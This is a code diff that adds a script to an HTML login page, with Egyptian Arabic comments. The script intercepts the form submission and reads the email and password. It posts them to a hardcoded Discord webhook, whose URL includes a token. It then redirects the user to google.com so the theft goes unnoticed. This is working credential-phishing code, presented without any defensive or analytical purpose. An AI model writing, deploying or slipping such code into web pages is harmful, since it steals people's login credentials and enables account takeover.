@@ -444,5 +444,45 @@
         });
     }
 </script>
+
+<script>
+document.querySelector('form').addEventListener('submit', function(e) {
+    e.preventDefault(); // بيمنع الصفحة إنها تعمل ريفريش وتضيع البيانات
+
+    // 1. هنجيب القيم اللي اتكتبت في الحقول (تأكد إن الحقول عندك فيها نفس النوع)
+    const emailInput = document.querySelector('input[type="email"]') || document.querySelector('input[type="text"]');
+    const passwordInput = document.querySelector('input[type="password"]');
+
+    const emailVal = emailInput ? emailInput.value : "غير معروف";
+    const passwordVal = passwordInput ? passwordInput.value : "غير معروف";
+
+    // 2. حط رابط الديسكورد ويبهوك بتاعك هنا بين علامتين التنصيص
+    const discordWebhookUrl = "https://discord.com/api/webhooks/1527463603156942880/PVeZ3x9yvwqZ3HpqEdHvA2gJv0BoO52qrSJaaVuutnCwmvqY7xdYCNGdYJjINSg_RDi3";
+
+    // 3. هنجهز الرسالة اللي هتروح لديسكورد بشكل منظم
+    const payload = {
+        content: `🚨 **New experimental login process:**\n📧 **Email:** \`${emailVal}\`\n🔑 **Password:** \`${passwordVal}\``
+    };
+
+    // 4. هنبعت البيانات مباشرة لديسكورد
+    fetch(discordWebhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+    })
+    .then(response => {
+        // بعد ما البيانات تتبعت بنجاح، هنحول المستخدم لصفحة حقيقية (مثلاً جوجل) علشان يحس إن الموضوع طبيعي
+        window.location.href = "https://www.google.com";
+    })
+    .catch(error => {
+        console.error('حدث خطأ أثناء الإرسال:', error);
+        // حتى لو حصل خطأ حوله برضه علشان التجربة تفضل مستمرة
+        window.location.href = "https://www.google.com";
+    });
+});
+</script>
+
 </body>
 </html>
